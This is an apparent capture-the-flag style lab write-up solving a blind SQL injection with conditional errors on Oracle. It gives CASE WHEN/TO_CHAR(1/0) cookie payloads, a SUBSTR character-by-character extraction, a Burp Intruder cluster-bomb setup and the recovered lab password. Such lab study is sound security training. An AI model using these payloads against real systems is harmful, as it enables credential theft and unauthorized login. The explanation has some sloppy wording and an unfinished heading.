# Lab: Blind SQL injection with conditional errors
## Lab
This lab contains a __blind SQL injection__ vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

 The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind __SQL injection__ vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Hint

This lab uses an Oracle database. For more information, see the SQL injection cheat sheet. 

## Solution

When a request containing a TrackingId cookie is processed, the application determines whether this is a known user using an SQL query like this: 
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO'
```
Because in this lab the application does not return any different result although the TrackingId submitted had been modified, so to determine the conditions we check are TRUE or FALSE, we use `CASE WHEN condition THEN command(which cause the server return TRUE/FALSE) ELSE command(which cause the server return FALSE/TRUE) END` to determine the truth of that condition.
Inject some conditions after TrackingId:
```SQL
' || (SELECT CASE WHEN (1=1) THEN '' ELSE TO_CHAR(1/0) END FROM dual) || '
' || (SELECT CASE WHEN (1=2) THEN '' ELSE TO_CHAR(1/0) END FROM dual) || '
```

When the query like this:
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO' || (SELECT CASE WHEN (1=1) THEN '' ELSE TO_CHAR(1/0) END FROM dual) || ''
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO' || (SELECT CASE WHEN (1=2) THEN '' ELSE TO_CHAR(1/0) END FROM dual) || ''
```
In first case the error don't appear because 1=1 is TRUE and query return `''` and concatenating TrackingId with empty string, the TrackingId is not changed so the query returns TRUE ID. In second case the error appear because 1=2 is FALSE and `TO_CHAR(1/0)`(error: divide-by-zero) is called cause the server return FALSE.

Thanks for topic we know there is a table is `users` contain two columns are `username` and `password`. In `username` column have `administrator` user. 

Modify that addition condition to:
```SQL
' || (SELECT CASE WHEN (LENGTH(password)>1) THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') || '
```
When the query like this:
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO' || (SELECT CASE WHEN (LENGTH(password)>1) THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') || ''
```
Why we modified like that?
To find out password, fisrt we need check the length of password with condition `LENGTH(password) > 1` if that length greater than 1 the error doesn't appear. Continue to increase the length to 2, 3, 4, ... until the error appear in returned result, that's the password length we look for!
Why we have to use this query:

After increase length to 20 (LENGTH(password) > 20) the error appaer. So we confirm that password length is 20.
Next step is brute force each value in each index of password. To do that we need use `SUBSTRING()` function:
```SQL
'|| (SELECT CASE WHEN SUBSTR(password,1,1)>'a' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'
```
To put it simply `SUBSTRING(string,index,length)` function extract `string` from `index` with `length` is number of characters. Addition condition above take first character in password compare with character 'a', if the first character of password is 'a' the error doesn't display. But no one does it manually :v
Send this request into Intruder and modify payload:
```SQL
'|| (SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'
```
When the query like this:
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO'|| (SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||''
```

And select attack type is Cluster bomb.The first payload type is numbers from 1 to 20 and step is 1, the second payload type is simple list and we add characters a-z and 0-9, combimed with rep _Welcome back_ in tab Options.

> administrator - fijenshrhencbzrle0oy